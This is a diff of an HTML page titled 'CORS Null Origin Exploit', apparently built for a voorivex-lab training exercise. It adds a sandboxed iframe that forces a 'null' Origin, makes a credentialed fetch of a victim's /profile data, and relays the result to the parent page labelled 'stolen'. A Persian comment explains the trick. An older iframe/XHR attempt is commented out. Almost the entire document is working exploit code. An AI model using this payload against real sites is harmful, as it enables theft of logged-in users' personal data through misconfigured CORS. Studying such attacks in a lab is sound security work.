@@ -8,7 +8,44 @@
 </head>
 
 <body>
-<iframe src="https://mo7bd8fddp.voorivex-lab.online/profile"></iframe>
+    <!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Null Origin Exploit</title>
+</head>
+<body>
+    <h3>Loading...</h3>
+
+    <!--
+        این iframe به‌خاطر sandbox بدون allow-same-origin، باعث می‌شه
+        هر کدی که داخلش اجرا بشه، Origin رو دقیقاً "null" بفرسته --
+        بدون نیاز به مالکیت هیچ دامنه‌ی خاصی.
+    -->
+    <iframe sandbox="allow-scripts allow-forms" srcdoc="
+        <script>
+            fetch('https://vljou3toas.voorivex-lab.online/profile', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(r => r.json())
+            .then(data => {
+                parent.postMessage({stolen: data}, '*');
+            })
+            .catch(err => {
+                parent.postMessage({error: err.toString()}, '*');
+            });
+        </script>
+    "></iframe>
+
+    <script>
+        window.addEventListener('message', function(event) {
+            console.log('Result:', event.data);
+            document.body.innerHTML += '<pre>' + JSON.stringify(event.data, null, 2) + '</pre>';
+        });
+    </script>
+</body>
+</html>
+<!-- <iframe src="https://mo7bd8fddp.voorivex-lab.online/profile"></iframe>
     <script>
 
         var xhttp = new XMLHttpRequest();
@@ -27,7 +64,7 @@
         xhttp.send();
 
 
-    </script>
+    </script> -->
 
 </body>
 
